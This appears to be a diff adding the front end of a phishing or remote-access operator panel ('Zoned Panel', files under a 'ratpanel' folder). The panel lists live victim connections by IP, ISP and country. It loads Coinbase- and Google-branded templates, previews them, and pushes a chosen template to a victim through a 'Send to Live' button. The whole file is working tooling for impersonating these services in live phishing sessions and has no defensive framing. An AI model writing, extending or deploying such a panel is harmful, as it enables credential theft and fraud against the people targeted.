@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoned Panel</title>
+  <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
+  <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" crossorigin="anonymous"></script>
+</head>
+<body class="bg-gray-100">
+
+<div id="root"></div>
+
+<script type="text/babel">
+
+function App() {
+  const [activeTab, setActiveTab] = React.useState('dashboard');
+  const [loading, setLoading] = React.useState(true);
+
+  React.useEffect(() => {
+    const timer = setTimeout(() => setLoading(false), 500);
+    return () => clearTimeout(timer);
+  }, []);
+
+  if (loading) {
+    return (
+      <div className="flex items-center justify-center min-h-screen bg-blue-600 text-white">
+        <h1 className="text-3xl font-bold">Loading, its not your internet we are loading the assets....</h1>
+      </div>
+    );
+  }
+
+  return (
+    <div className="min-h-screen flex flex-col">
+      <header className="bg-blue-600 text-white p-4 shadow flex items-center justify-between">
+        <div></div>
+        <h1 className="text-2xl font-bold">Zoned Panel</h1>
+        <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" alt="Profile" className="h-8 w-8 rounded-full" />
+      </header>
+
+
+      <main className="flex-1 p-6">
+        {activeTab === 'dashboard' && <Dashboard />}
+        {activeTab === 'inputDetections' && <InputDetections />}
+      </main>
+    </div>
+  );
+}
+
+
+
+function Dashboard() {
+  const [connections, setConnections] = React.useState([]);
+  const [modalOpen, setModalOpen] = React.useState(false);
+  const [activePreview, setActivePreview] = React.useState(null);
+  const [coinbaseFiles, setCoinbaseFiles] = React.useState([]);
+  const [googleFiles, setGoogleFiles] = React.useState([]);
+
+  React.useEffect(() => {
+    const socket = io();
+    socket.on('all-connections', data => setConnections(data));
+    socket.on('new-connection', conn => setConnections(prev => [...prev, conn]));
+    return () => socket.disconnect();
+  }, []);
+
+  React.useEffect(() => {
+    fetch('/api/files?path=C:\\Users\\z\\Downloads\\EVERYTHING\\ratpanel\\coinbase')
+      .then(res => res.json())
+      .then(data => setCoinbaseFiles(data.files));
+
+    fetch('/api/files?path=C:\\Users\\z\\Downloads\\EVERYTHING\\ratpanel\\google')
+      .then(res => res.json())
+      .then(data => setGoogleFiles(data.files));
+  }, []);
+
+  const openPreview = (content) => {
+    setActivePreview(content);
+    setModalOpen(true);
+  };
+
+  const closeModal = () => setModalOpen(false);
+
+  // New function to send preview to live
+  const sendToLive = () => {
+    if (!activePreview) return;
+    fetch('/api/live/send-template', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: activePreview })
+    })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          alert('Template sent to live successfully!');
+        } else {
+          alert('Failed to send template.');
+        }
+      })
+      .catch(err => console.error(err));
+  };
+
+  return (
+    <div>
+      {/* Connections table */}
+      <div>
+        <h2 className="text-xl font-semibold mb-4">connections:</h2>
+        <div className="overflow-x-auto mb-6">
+          <table className="min-w-full bg-white border border-gray-300">
+            <thead>
+              <tr className="bg-gray-100">
+                <th className="border px-4 py-2">IP</th>
+                <th className="border px-4 py-2">ISP</th>
+                <th className="border px-4 py-2">Country</th>
+                <th className="border px-4 py-2">Actions</th>
+              </tr>
+            </thead>
+            <tbody>
+              {connections.map(conn => (
+                <tr key={conn.id} className="transition-colors duration-500 hover:bg-gray-100">
+                  <td className="border px-4 py-2">{conn.ip}</td>
+                  <td className="border px-4 py-2">{conn.isp}</td>
+                  <td className="border px-4 py-2">{conn.countryName}</td>
+                  <td className="border px-4 py-2">
+                    <button onClick={() => openPreview('<p>Preview content</p>')} className="p-1">
+                      <img
+                        src="https://cdn.discordapp.com/attachments/1404828812121735241/1405346833353674822/file.png?ex=689f277b&is=689dd5fb&hm=e89c907e93e2df50bebb08c7697fa100d5fe861da93d056dc2b57c8f655126f9&"
+                        alt="Preview Icon"
+                        className="w-6 h-6"
+                      />
+                    </button>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      {/* Modal */}
+      {modalOpen && (
+        <div className="fixed inset-0 bg-black bg-opacity-60 z-50 flex items-start justify-center p-10 overflow-auto">
+          <div className="bg-white rounded-xl w-full max-w-[1200px] h-[85vh] flex gap-4 relative shadow-lg">
+            <button className="absolute top-4 right-6 text-2xl font-bold text-gray-700 hover:text-gray-900" onClick={closeModal}>×</button>
+
+            {/* Coinbase Card */}
+            <div className="flex-1 flex flex-col border rounded-lg overflow-hidden shadow-sm">
+              <div className="flex items-center gap-2 p-2 bg-white-100">
+                <img src="https://cdn.discordapp.com/attachments/1404828812121735241/1405699755706814606/coinbase.png?ex=689fc76a&is=689e75ea&hm=74c0d98fcc7b565a50e7b62cece346bb09063a53f96ee5385f386d579e01e2f8&" alt="Coinbase Logo" className="w-8 h-8"/>
+                <h3 className="text-lg font-semibold">Coinbase</h3>
+              </div>
+              <div className="flex-1 overflow-y-auto p-2 flex flex-col gap-2">
+                {coinbaseFiles.map((file, i) => (
+                  <button
+                    key={i}
+                    className={`p-2 border rounded hover:bg-blue-100 text-left ${activePreview === file.content ? 'bg-blue-200' : ''}`}
+                    onClick={() => setActivePreview(file.content)}
+                  >
+                    {file.name}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {/* Google Card */}
+            <div className="flex-1 flex flex-col border rounded-lg overflow-hidden shadow-sm">
+              <div className="flex items-center gap-2 p-2 bg-white-100">
+                <img src="https://cdn.discordapp.com/attachments/1404828812121735241/1405700562472665222/download.png?ex=689fc82a&is=689e76aa&hm=fbf9d188b0858d7a203e04e6a82d8acfcc5ad082e8c542ea3510ec8e967780ca&" alt="Google Logo" className="w-8 h-8"/>
+                <h3 className="text-lg font-semibold">Google</h3>
+              </div>
+              <div className="flex-1 overflow-y-auto p-2 flex flex-col gap-2">
+                {googleFiles.map((file, i) => (
+                  <button
+                    key={i}
+                    className={`p-2 border rounded hover:bg-green-100 text-left ${activePreview === file.content ? 'bg-green-200' : ''}`}
+                    onClick={() => setActivePreview(file.content)}
+                  >
+                    {file.name}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {/* Preview iframe */}
+            <div className="flex-1 flex flex-col border rounded-lg overflow-hidden shadow-sm">
+              <iframe
+                title="Preview"
+                className="w-full flex-1"
+                srcDoc={activePreview || '<p class="text-center mt-10">Select a template to preview</p>'}
+              />
+              
+              {/* Send to Live Button */}
+              <button
+                className="mt-2 p-2 bg-blue-500 text-white rounded hover:bg-blue-600"
+                onClick={sendToLive}
+              >
+                Send to Live
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+</script>
+</body>
+</html>
